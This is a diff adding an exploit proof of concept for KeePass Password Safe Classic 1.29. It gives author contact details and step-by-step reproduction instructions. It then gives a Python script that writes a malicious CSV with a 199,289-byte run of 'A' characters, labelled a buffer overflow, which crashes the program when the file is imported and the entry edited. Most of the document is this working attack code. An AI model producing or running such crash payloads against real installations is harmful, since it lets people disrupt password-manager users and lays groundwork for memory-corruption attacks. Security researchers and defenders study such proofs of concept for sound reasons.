@@ -1,0 +1,37 @@
+# Title : KeePass Password Safe Classic 1.29 - Crash Proof Of Concept
+# Affected Versions: All Version
+# Founder : keepass.info
+# Tested on Windows 7 / Server 2008
+# Download Link : http://sourceforge.net/projects/keepass/files/KeePass%201.x/1.30/KeePass-1.30.zip
+#
+#
+# Author      :   Mohammad Reza Espargham
+# Linkedin    :   https://ir.linkedin.com/in/rezasp
+# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
+# Website     :   www.reza.es
+# Twitter     :   https://twitter.com/rezesp
+# FaceBook    :   https://www.facebook.com/reza.espargham
+#
+#
+# 1 . run python code : python crash.py
+# 2 . open “KeePass”
+# 3 . File —> New (Create New Password Database)
+# 4 . File —> Import —> CSV File…
+# 5 . open r3z4.csv
+# 6 . Right Click on “R3Z4” username and edit
+# 7 . Crashed ;)
+
+
+
+#!/usr/bin/env python
+hdr = '"' #start syntax
+hcr = "R3Z4" #user
+oth = ',"' #user
+oth2 = '","",""' #user
+val=','
+crash = "\x41"*199289 #B0F
+exp = hdr+hcr+hdr+val+hdr+hcr+hdr+oth+crash+oth2
+file = open("r3z4.csv", "w")
+file.write(exp)
+file.close()
+
